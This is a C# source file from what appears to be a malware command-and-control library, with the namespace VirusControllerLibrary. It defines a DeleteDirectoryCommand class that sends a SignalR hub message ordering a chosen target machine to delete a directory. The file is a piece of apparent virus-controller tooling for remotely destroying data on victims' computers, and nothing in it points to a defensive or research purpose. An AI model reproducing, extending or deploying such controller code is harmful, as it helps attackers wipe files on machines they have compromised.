using Microsoft.AspNetCore.SignalR.Client;
using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    public class DeleteDirectoryCommand : AdminHubCommand, IHaveOneTargetCommand
    {
        public string TargetId { get; private set; }
        public string DirectoryName { get; private set; }
        public override string Name => "DeleteDirectory";

        public DeleteDirectoryCommand(string targetId, string directoryPath)
        {
            TargetId = targetId;
            DirectoryName = directoryPath;
        }
        public override async Task ExecuteAsync() =>
            await _hubConnection?.InvokeAsync(Name, TargetId, DirectoryName);
    }
}
